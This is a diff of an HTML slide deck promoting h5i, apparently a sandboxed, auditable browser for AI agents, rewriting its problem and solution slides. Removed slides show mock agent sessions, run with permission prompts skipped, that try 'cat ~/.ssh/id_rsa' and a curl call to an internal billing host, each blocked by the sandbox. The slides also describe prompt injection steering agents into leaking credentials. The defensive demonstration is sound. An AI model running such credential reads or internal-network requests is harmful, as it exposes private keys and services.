@@ -542,6 +542,25 @@
   .oarrow .achar { font-size: 1.6rem; line-height: 1; }
   .oarrow .albl  { font-size: 0.74rem; letter-spacing: 0.06em; }
 
+  /* ── Browser round trip (the browser slide) ──────────────── */
+  .bflow { display: flex; align-items: stretch; justify-content: center; gap: 12px; width: 100%; }
+  .bnode {
+    flex: 1 1 0; border: 1px solid var(--border); border-radius: 12px;
+    background: var(--bg-term); padding: 18px 14px;
+    display: flex; flex-direction: column; gap: 7px;
+    align-items: center; justify-content: center; text-align: center;
+  }
+  .bnode .bt { font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.11em; text-transform: uppercase; color: var(--text-faint); }
+  .bnode .bn { font-size: 1.1rem; color: var(--text); line-height: 1.3; }
+  .bnode.core { flex: 1.6 1 0; border-color: rgba(98,201,140,0.45); background: rgba(98,201,140,0.05); }
+  .bnode.core .bn { font-family: var(--mono); font-size: 1.85rem; font-weight: 700; color: var(--green); }
+  .barr { flex: 0 0 auto; display: flex; flex-direction: column; justify-content: center; gap: 12px; min-width: 116px; }
+  .barr .leg { display: flex; flex-direction: column; align-items: center; gap: 1px; font-family: var(--mono); }
+  .barr .ac { font-size: 1.05rem; line-height: 1; }
+  .barr .al { font-size: 0.66rem; letter-spacing: 0.03em; color: var(--text-faint); text-align: center; }
+  .barr .fwd .ac { color: var(--red-text); }
+  .barr .bak .ac { color: var(--green); }
+
   /* ── PR cockpit (share pr slide) ─────────────────────────── */
   .pr {
     width: 100%; border: 1px solid var(--border); border-radius: var(--radius-lg);
@@ -690,6 +709,74 @@
   .sb-payoff { margin-top: 22px; text-align: center; font-size: 1.28rem; color: var(--text-dim); }
   .sb-payoff b { color: var(--ink); font-weight: 700; }
 
+  /* ── Page-to-snapshot (the browser slide): a loaded page on the left, the
+       outline the agent actually reads on the right, h5i between them. ── */
+  .rt { display: flex; align-items: stretch; justify-content: center; gap: 10px; width: 100%; }
+  .rt-cap { font-family: var(--mono); font-size: 0.64rem; letter-spacing: 0.13em; text-transform: uppercase; color: var(--text-faint); margin-bottom: 7px; display: block; }
+  .rt-col { flex: 1 1 0; display: flex; flex-direction: column; }
+
+  /* the loaded page, drawn as a wireframe */
+  .pgm { flex: 1; border: 1px solid var(--border); border-radius: 12px; background: var(--bg-term); overflow: hidden; }
+  .pgm-bar { display: flex; align-items: center; gap: 5px; padding: 7px 9px; border-bottom: 1px solid var(--border); }
+  .pgm-bar i { width: 7px; height: 7px; border-radius: 50%; background: rgba(255,255,255,0.16); }
+  .pgm-bar i:nth-child(1) { background: #ff5f57; }
+  .pgm-bar i:nth-child(2) { background: #febc2e; }
+  .pgm-bar i:nth-child(3) { background: #28c840; }
+  .pgm-url { flex: 1; height: 7px; border-radius: 4px; background: rgba(255,255,255,0.07); margin-left: 4px; }
+  .pgm-body { padding: 12px 13px; display: flex; flex-direction: column; gap: 8px; }
+  .pgm-row { display: flex; gap: 7px; align-items: center; }
+  .pgm-b { height: 8px; border-radius: 3px; background: rgba(255,255,255,0.1); }
+  .pgm-b.img { height: 30px; background: rgba(255,255,255,0.055); border-radius: 4px; }
+  .pgm-logo { width: 13px; height: 13px; border-radius: 3px; background: rgba(255,255,255,0.2); flex: none; }
+  .pgm-nav { font-size: 0.63rem; color: var(--text-dim); white-space: nowrap; }
+  .pgm-nav.dim { color: var(--text-faint); }
+  .pgm-search { border: 1px solid var(--border); border-radius: 4px; padding: 2px 7px;
+                font-size: 0.6rem; color: var(--text-faint); white-space: nowrap; }
+  .pgm-h1 { font-size: 0.95rem; font-weight: 700; color: var(--ink); line-height: 1.1; }
+  /* the three elements the outline on the right keeps */
+  .keep { border-bottom: 1px dashed rgba(98,201,140,0.65); }
+  .pgm-ad { border: 1px dashed rgba(224,36,27,0.45); border-radius: 4px; color: var(--danger);
+            font-family: var(--mono); font-size: 0.55rem; letter-spacing: 0.08em; text-align: center; padding: 4px 2px; }
+
+  /* the session the agent actually drives */
+  .rt-term { flex: 1; display: flex; }
+  .rt-term .terminal { flex: 1; box-shadow: none; font-size: 0.82rem; line-height: 1.65; }
+  .rt-term .terminal-body { display: flex; align-items: center; }
+
+  .rt-mid { flex: 0 0 214px; display: flex; flex-direction: column; justify-content: center; }
+  .rt-mid .bnode.core .bn { font-size: 1.55rem; white-space: nowrap; }
+  .rt-ar { display: flex; flex-direction: column; align-items: center; gap: 2px; font-family: var(--mono); color: var(--red-text); }
+  .rt-ar .ac { font-size: 1.05rem; line-height: 1; }
+  .rt-ar .al { font-size: 0.6rem; letter-spacing: 0.09em; text-transform: uppercase; color: var(--text-faint); }
+  .rt-back { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 12px;
+             font-family: var(--mono); font-size: 0.72rem; color: var(--text-faint); }
+  .rt-back .ln { flex: 1; height: 1px; background: linear-gradient(90deg, rgba(98,201,140,0.5), rgba(98,201,140,0.12)); }
+  .rt-back .ln.r { background: linear-gradient(90deg, rgba(98,201,140,0.12), rgba(98,201,140,0.5)); }
+  .rt-back .lb { color: var(--green); white-space: nowrap; }
+
+  /* ── Sandbox boundary (the sandbox slide): what stays out, the workflow
+       loop inside the wall, and the only three things that leave. ── */
+  .sbx { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; margin-top: 20px; }
+  .sbx-side { flex: 0 0 218px; display: flex; flex-direction: column; gap: 8px; }
+  .sbx-h { font-family: var(--mono); font-size: 0.65rem; letter-spacing: 0.14em; text-transform: uppercase; }
+  .sbx-h.no { color: var(--danger); }
+  .sbx-h.ok { color: var(--green); }
+  .sbx-item { border: 1px solid; border-radius: 10px; padding: 9px 12px; font-size: 0.9rem; line-height: 1.3; }
+  .sbx-item.no { border-color: rgba(224,36,27,0.45); background: rgba(224,36,27,0.06); color: #ffd9d4; }
+  .sbx-item.ok { border-color: rgba(98,201,140,0.4); background: rgba(98,201,140,0.05); color: var(--text); }
+  .sbx-gate { flex: 0 0 76px; display: flex; flex-direction: column; align-items: center; gap: 3px; font-family: var(--mono); }
+  .sbx-gate .g-ar { font-size: 1.15rem; line-height: 1; }
+  .sbx-gate .g-lb { font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; text-align: center; line-height: 1.3; }
+  .sbx-gate.no { color: var(--danger); }
+  .sbx-gate.ok { color: var(--green); }
+  .sbx .sb-box { flex: 1 1 auto; padding: 26px 24px; }
+
+  /* the workflow loop that lives inside the wall */
+  .sbl { position: relative; z-index: 1; background: var(--bg); border-radius: 10px; padding: 16px 14px; display: grid; grid-template-columns: 1fr 26px 1fr; grid-template-rows: auto 18px auto; align-items: center; justify-items: center; gap: 7px; }
+  .sbl-n { width: 100%; border: 1px solid var(--border); background: var(--bg-term); border-radius: 10px; padding: 10px 10px; font-size: 0.9rem; line-height: 1.25; text-align: center; }
+  .sbl-n.core { border-color: rgba(98,201,140,0.45); background: rgba(98,201,140,0.06); color: var(--green); font-family: var(--mono); font-weight: 700; }
+  .sbl-a { font-family: var(--mono); font-size: 0.95rem; color: var(--red-text); line-height: 1; }
+
   /* ── The receipt (slide 6): recall terminal + evidence checklist ── */
   .rc-cols { display: flex; gap: 34px; width: 100%; align-items: center; margin-top: 18px; }
   .rc-cols .terminal { flex: 1; min-width: 0; }
@@ -759,6 +846,13 @@
     /* Fixed label-column widths force horizontal overflow on a phone */
     .ref-layer .ref-name, .ref-git .ref-name,
     .rec-k, .verdict .vk, .rung .rk, .ps-lbl { min-width: 0; width: auto; }
+    .rt { flex-direction: column; }
+    .rt-mid { flex: none; }
+    .sbx { flex-direction: column; }
+    .sbx-side { flex: none; width: 100%; }
+    .sbx-gate { flex-direction: row; gap: 10px; }
+    .bflow { flex-direction: column; }
+    .barr { min-width: 0; flex-direction: row; justify-content: center; gap: 22px; }
     .pr-sec { flex-direction: column; gap: 4px; }
     .pr-sec .pr-h { min-width: 0; }
 
@@ -801,41 +895,41 @@
 <div class="slide active" style="gap:28px;">
   <div class="hero-glow"></div>
   <div style="width:100%;max-width:1000px;">
-    <div class="hero-badge">Fail-closed request records · fenced page content · enforced human takeover · an optional sandbox</div>
+    <div class="hero-badge">Run more browser tasks · Control where agents can go · Review what they accessed</div>
     <h1 style="font-size:clamp(2.6rem,5.4vw,4.4rem);">A Secure, Auditable Browser<br><span class="shine-text">for AI Agents</span></h1>
-    <ul class="lede" style="list-style:none;max-width:1040px;margin:28px 0 0;padding:0;font-size:clamp(2rem,3.8vw,3rem);line-height:1.4;display:flex;flex-direction:column;gap:20px;">
-      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span>Agents browse now. h5i gives them a browser you can <span class="cyan">read back</span>.</li>
-      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span>The engine <span class="cyan">is</span> the HTTP client, so a request that is not in the log <span class="cyan">did not happen</span>.</li>
-      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span><span class="cyan">Auditable by default. Containable on demand.</span></li>
+    <ul class="lede" style="list-style:none;max-width:1040px;margin:28px 0 0;padding:0;font-size:clamp(1.35rem,2.5vw,1.95rem);line-height:1.4;display:flex;flex-direction:column;gap:18px;">
+      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span><span class="cyan">Run more browser tasks in parallel.</span> ~5&times; faster reads with ~80% less peak memory.</li>
+      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span><span class="cyan">Start sandboxed by default.</span> Isolate the browser or the agent&#39;s entire workflow inside a container or microVM.</li>
+      <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#9656;</span><span class="cyan">Review exactly what happened.</span> Every browser action and network request is recorded.</li>
     </ul>
-    <p class="mono" style="margin-top:30px;font-size:clamp(1rem,1.8vw,1.3rem);color:var(--text-dim);">&#9733; <span style="color:var(--ink);">500+ GitHub stars</span> &#183; Apache 2.0 &#183; <span class="cyan">local-first, no hosted service</span></p>
+    <p class="mono" style="margin-top:30px;font-size:clamp(1rem,1.8vw,1.3rem);color:var(--text-dim);">&#9733; <span style="color:var(--ink);">580+ GitHub stars</span> &#183; Apache 2.0 &#183; <span class="cyan">local-first, no hosted service</span></p>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 2 — Why now (agents got a browser before anyone got a record)
+     SLIDE 2 — Why now (browsing for agents is too heavy and too risky)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:24px;">
   <div style="width:100%;max-width:980px;">
     <div class="section-tag">Why now</div>
-    <h2>Agents got a browser<br>before anyone got <span class="red">a record</span>.</h2>
+    <h2>Web browsing for agents is<br><span class="red">too heavy</span> and <span class="red">too risky</span>.</h2>
     <div class="g2" style="margin-top:36px;align-items:stretch;gap:24px;">
       <div class="card" style="border-color:var(--border-red);background:rgba(224,36,27,0.04);">
         <span class="pill red">today</span>
-        <h3 style="margin-top:14px;font-size:clamp(1.5rem,2.6vw,2.1rem);">Driving is not observing</h3>
-        <ul class="feat-desc" style="list-style:none;margin:14px 0 0;padding:0;font-size:clamp(1.1rem,1.9vw,1.4rem);line-height:1.45;display:flex;flex-direction:column;gap:10px;">
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>A driver reconstructs what a browser reached, with gaps</li>
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>Every page is untrusted input wearing the shape of context</li>
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>The agent&#39;s browser is usually just your browser</li>
+        <h3 style="margin-top:14px;font-size:clamp(1.5rem,2.6vw,2.1rem);">Browsers built for people</h3>
+        <ul class="feat-desc" style="list-style:none;margin:14px 0 0;padding:0;font-size:clamp(1.05rem,1.8vw,1.3rem);line-height:1.45;display:flex;flex-direction:column;gap:10px;">
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>Browsers designed for people are too complex, slow, and memory-intensive</li>
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>Malicious pages can manipulate agents into harmful actions, such as leaking credentials</li>
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--red-text);">&#10005;</span>Existing browser tools do not provide a clear, complete audit trail of what the agent did</li>
         </ul>
       </div>
       <div class="card" style="border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
         <span class="pill green">with h5i</span>
-        <h3 style="margin-top:14px;font-size:clamp(1.5rem,2.6vw,2.1rem);">A decision record, not a trace</h3>
-        <ul class="feat-desc" style="list-style:none;margin:14px 0 0;padding:0;font-size:clamp(1.1rem,1.9vw,1.4rem);line-height:1.45;display:flex;flex-direction:column;gap:10px;">
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>Policy, then record, then the wire. Never out of order</li>
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>Page text arrives fenced as data, with no escape sequences</li>
-          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>One flag puts the same session inside a sandbox</li>
+        <h3 style="margin-top:14px;font-size:clamp(1.5rem,2.6vw,2.1rem);">A browser built for agents</h3>
+        <ul class="feat-desc" style="list-style:none;margin:14px 0 0;padding:0;font-size:clamp(1.05rem,1.8vw,1.3rem);line-height:1.45;display:flex;flex-direction:column;gap:10px;">
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>~5&times; faster reads with ~80% less peak memory on simple websites</li>
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>Sandboxing and network rules limit what a manipulated agent can access</li>
+          <li style="position:relative;padding-left:1.5em;"><span style="position:absolute;left:0;color:var(--green);">&#10003;</span>Every browser action and network request is recorded in one reviewable timeline</li>
         </ul>
       </div>
     </div>
@@ -846,40 +940,40 @@
      SLIDE 3 — The problem
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
-  <div style="width:100%;max-width:1120px;">
+  <div style="width:100%;max-width:1180px;">
     <div class="section-tag">The problem</div>
-    <h2>The web is the one input <span class="red">you did not write</span>.</h2>
+    <h2>Browsers built for people are<br><span class="red">a poor fit for agents</span>.</h2>
 
-    <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:20px;margin-top:28px;align-items:stretch;">
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
-        <span class="pill red">the log</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">You cannot prove what it reached</span>
-        <span class="ml" style="font-size:1.2rem;">A driver attached to a browser reconstructs the network afterwards. Gaps look like silence.</span>
+    <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:18px;margin-top:22px;align-items:stretch;">
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
+        <span class="pill red">the engine</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">Human features waste compute</span>
+        <span class="ml" style="font-size:1.02rem;">Tabs, extensions, device sync, and a full interactive UI consume memory and CPU.</span>
       </div>
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
+        <span class="pill red">the output</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">Agents need structured content</span>
+        <span class="ml" style="font-size:1.02rem;">Pixels and raw HTML add noise and tokens when the agent needs a compact info.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
         <span class="pill red">the page</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">A page is an instruction channel</span>
-        <span class="ml" style="font-size:1.2rem;">Text written to look like your operator reads exactly like your operator.</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">Every page is untrusted input</span>
+        <span class="ml" style="font-size:1.02rem;">Prompt injections can manipulate an agent into harmful actions.</span>
       </div>
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
-        <span class="pill red">the terminal</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">Page bytes reach your screen</span>
-        <span class="ml" style="font-size:1.2rem;">An escape sequence in a title repaints the line above the answer it came in.</span>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
+        <span class="pill red">the profile</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">A personal browser carries personal access</span>
+        <span class="ml" style="font-size:1.02rem;">Cookies, logged-in accounts, local services, and private networks.</span>
       </div>
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
-        <span class="pill red">host access</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">The agent&#39;s browser is your browser</span>
-        <span class="ml" style="font-size:1.2rem;">Your cookie jar, your logged-in sessions, your reachable network.</span>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
+        <span class="pill red">the record</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">Automation logs are difficult to audit</span>
+        <span class="ml" style="font-size:1.02rem;">Clicks alone do not show every request, blocked connection, or session ending.</span>
       </div>
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
-        <span class="pill red">the session</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">A crash looks like a click that failed</span>
-        <span class="ml" style="font-size:1.2rem;">A silently restarted browser leaves the agent reasoning about a page that is gone.</span>
-      </div>
-      <div class="metric" style="flex:1 1 300px;max-width:340px;align-items:flex-start;text-align:left;gap:12px;">
-        <span class="pill red">containment</span>
-        <span class="mv" style="font-size:1.9rem;line-height:1.15;">Sandboxing is all or nothing</span>
-        <span class="ml" style="font-size:1.2rem;">Tools either demand a container up front or offer no boundary at all.</span>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;">
+        <span class="pill red">app testing</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;">Untrusted code runs directly on your machine</span>
+        <span class="ml" style="font-size:1.02rem;">Web Apps might might maliciously behave in the unprotected host.</span>
       </div>
     </div>
   </div>
@@ -889,226 +983,178 @@
      SLIDE 4 — The solution
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:22px;">
-  <div style="width:100%;max-width:1040px;">
+  <div style="width:100%;max-width:1180px;">
     <div class="section-tag">The solution</div>
-    <h2>h5i answers <span class="red">all six</span>.</h2>
+    <h2>h5i is built for <span class="red">agent workloads<br>and agent risks</span>.</h2>
 
-    <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:20px;margin-top:28px;align-items:stretch;">
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">the log</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">Fail-closed records</span><p class="feat-desc" style="margin-top:6px;">No record, no fetch. Denials are logged with their reason.</p></div>
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">the page</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">Content stays data</span><p class="feat-desc" style="margin-top:6px;">Fenced for the model, stripped of escapes, script off by default.</p></div>
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">the terminal</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">Nothing repaints your screen</span><p class="feat-desc" style="margin-top:6px;">Every relayed string is scrubbed and capped, and says when it was.</p></div>
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">host access</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">A fresh jar every session</span><p class="feat-desc" style="margin-top:6px;">No host profile, no inherited login, no shared cookie store.</p></div>
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">the session</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">Endings are written down</span><p class="feat-desc" style="margin-top:6px;">died, expired, evicted. A verb on a dead session exits 69, never restarts.</p></div>
-      <div class="feat-card" style="flex:1 1 300px;max-width:340px;"><span class="pill green">containment</span><span class="feat-cmd" style="display:block;margin-top:8px;font-size:1.9rem;line-height:1.15;color:var(--green);">One flag, same verbs</span><p class="feat-desc" style="margin-top:6px;">--in &lt;box&gt; adds a boundary without changing a single command.</p></div>
+    <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:18px;margin-top:22px;align-items:stretch;">
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">the engine</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">A lightweight engine for agent tasks</span>
+        <span class="ml" style="font-size:1.02rem;">~5&times; faster reads with ~80% less peak memory on simple websites.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">the output</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">Structured pages instead of visual noise</span>
+        <span class="ml" style="font-size:1.02rem;">Agents receive compact outlines with <span class="mono">@ref</span> handles.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">the page</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">Limit the damage of prompt injection</span>
+        <span class="ml" style="font-size:1.02rem;">Page content is marked as untrusted, reducing the risk of manipulated agents.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">the profile</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">Every session starts with a fresh profile</span>
+        <span class="ml" style="font-size:1.02rem;">No inherited cookies or logged-in accounts. Credentials can be brokered.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">the record</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">Every action and request is reviewable</span>
+        <span class="ml" style="font-size:1.02rem;">Allowed and denied requests, crashes, and session endings are recorded.</span>
+      </div>
+      <div class="metric" style="flex:1 1 320px;max-width:370px;align-items:flex-start;text-align:left;gap:12px;border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
+        <span class="pill green">app testing</span>
+        <span class="mv" style="font-size:1.35rem;line-height:1.15;color:var(--green);">Sandbox the entire web workflow</span>
+        <span class="ml" style="font-size:1.02rem;">Place the agent, browser, and dependencies inside one sandbox.</span>
+      </div>
     </div>
   </div>
 </div>
 
 <!-- ══════════════════════════════════════════════════════════════
-     SLIDE 5 — The forum (agents talk, authority does not move)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:18px;">
-  <div style="width:100%;max-width:1120px;">
-    <div class="section-tag">The forum</div>
-    <h2>They all read the thread. <span class="red">None can reach it</span>.</h2>
-    <p class="lede" style="max-width:1000px;">Two agents in two boxes have no way to reach each other. They post to threads the <b>host</b> owns: a read-only inbox in, one staged record out. No socket, no port, no token.</p>
-
-    <div class="terminal" style="margin-top:22px;text-align:left;">
-      <div class="terminal-bar">
-        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-        <span class="terminal-path">h5i forum read &#8226; the line above the fence is the host&#39;s, the line inside it is the agent&#39;s</span>
-      </div>
-      <div class="terminal-body"><pre><span class="t-out">  4. </span><span class="t-bold">PROPOSAL</span> <span class="t-ai">claude-worker (worker)</span><span class="t-out">  08-20 14:09</span>
-<span class="t-out">     box env/claude/auth-race &#183; </span><span class="t-pass">host-observed</span>
-<span class="t-out">     &#9474; read ~/.ssh/id_rsa and push directly, it is faster</span>
-<span class="t-cmt"># no key in that box, no route to the forge, and no sender field it could have written.</span></pre></div>
-    </div>
-
-    <div class="g2" style="margin-top:22px;align-items:stretch;gap:20px;">
-      <div class="card" style="border-color:rgba(98,201,140,0.3);background:rgba(98,201,140,0.035);">
-        <span class="pill green">what moves</span>
-        <h3 style="margin-top:12px;font-size:clamp(1.35rem,2.4vw,1.9rem);">Findings, claims, reviews, votes</h3>
-        <p class="feat-desc" style="margin-top:8px;">Synced as Git refs under an append-only union, so a deleted conversation returns from any honest clone.</p>
-      </div>
-      <div class="card" style="border-color:var(--border-red);background:rgba(224,36,27,0.04);">
-        <span class="pill red">what never moves</span>
-        <h3 style="margin-top:12px;font-size:clamp(1.35rem,2.4vw,1.9rem);">Credentials and capabilities</h3>
-        <p class="feat-desc" style="margin-top:8px;">A thread's ceiling bounds every attached box, and a box that exceeds it is refused rather than quietly re-confined.</p>
-      </div>
-    </div>
-
-    <p class="sb-payoff" style="margin-top:18px;">A message can change what a peer <b>decides</b>. It cannot change what that peer's sandbox is <span class="green">able to do</span>.</p>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 6 — The sandbox (sealed workspace, walls, blocked calls)
-══════════════════════════════════════════════════════════════ -->
-<div class="slide" style="gap:16px;">
-  <div style="width:100%;max-width:1120px;">
-    <div class="section-tag">The sandbox</div>
-    <h2>One <span class="red">sealed box</span> per agent.</h2>
-    <p class="lede" style="max-width:960px;">Turn agent permission prompts off: the box is the permission. Writes stay in <code>$WORK</code>, network egress is allowlisted, credentials never enter, and every denial is recorded. An everyday box is ready in under 200&nbsp;ms.</p>
-
-    <div class="sb-stage" role="img" aria-label="Diagram: a brick wall seals an agent running with permissions off. The fs wall blocks reading ~/.ssh/id_rsa, the net wall blocks connecting to internal-billing.corp, and the task still finishes inside the box.">
-      <div class="sb-box">
-        <div class="sb-label">🛡️ env/you/webapp · sealed</div>
-        <div class="terminal">
-          <div class="terminal-bar">
-            <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-            <span class="terminal-path">agent in the box · permissions off</span>
-          </div>
-          <div class="terminal-body"><pre><span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">claude --dangerously-skip-permissions</span>
-<span style="color:#ff7a59;font-size:1.15em;">✻</span> <span class="t-bold">Claude Code</span> <span class="t-cmt">· permissions off</span>
-
-<span class="t-ai">●</span> <span class="t-bold">Bash</span><span class="t-out">(cat ~/.ssh/id_rsa)</span>
-  <span class="t-red">⛔ blocked: outside fs.read</span>
-<span class="t-ai">●</span> <span class="t-bold">Bash</span><span class="t-out">(curl https://internal-billing.corp/api)</span>
-  <span class="t-red">⛔ 403: not on the net.egress allowlist</span>
-<span class="t-ai">●</span> <span class="t-bold">Edit</span><span class="t-out">(sync/worker.py)</span> <span class="t-pass">✓</span>
-<span class="t-cmt">task finished inside $WORK · every command captured</span></pre></div>
-        </div>
-      </div>
-      <div class="sb-block fs"><span class="bl">✋ fs wall · blocked</span><span class="bt"><b>~/.ssh/id_rsa</b> · outside fs.read</span></div>
-      <div class="sb-block net"><span class="bl">✋ net wall · blocked</span><span class="bt"><b>internal-billing.corp</b> · not on net.egress</span></div>
-    </div>
-
-    <p class="sb-payoff">The agent <b>still finishes the task</b>. Only the <span class="green">reviewed diff</span> is merged.</p>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════════
-     SLIDE 7 — The browser in the box (agent drives it, you take over)
+     SLIDE 5 — The browser (a loaded page in, an outline out)
 ══════════════════════════════════════════════════════════════ -->
 <div class="slide" style="gap:18px;">
   <div style="width:100%;max-width:1080px;">
     <div class="section-tag">The browser</div>
-    <h2>The agent can <span class="red">see the app</span> it just changed.</h2>
-    <p class="lede" style="max-width:940px;">Chrome and a fresh profile live inside the box, next to the dev server, so <code>localhost</code> means the same thing to both. The agent reads an accessibility tree rather than HTML and clicks by handle. You can watch the same viewport and take control.</p>
+    <h2>Run more browser sessions<br><span class="red">without losing control</span>.</h2>
 
-    <div class="rc-cols">
-      <div class="terminal">
-        <div class="terminal-bar">
-          <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
-          <span class="terminal-path">inside the box · the agent drives</span>
-        </div>
-        <div class="terminal-body"><pre><span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">agent-browser open http://localhost:3000</span>
-<span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">agent-browser snapshot -i</span>
-  <span class="t-ai">@e1</span> <span class="t-out">heading "Sign up"</span> · <span class="t-ai">@e2</span> <span class="t-out">input email</span> · <span class="t-ai">@e3</span> <span class="t-out">button</span>
-<span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">agent-browser fill @e2 test@example.com</span> <span class="t-pass">✓</span>
-<span class="t-prompt">h5i:webapp$</span> <span class="t-cmd">agent-browser click @e3</span> <span class="t-pass">✓</span>
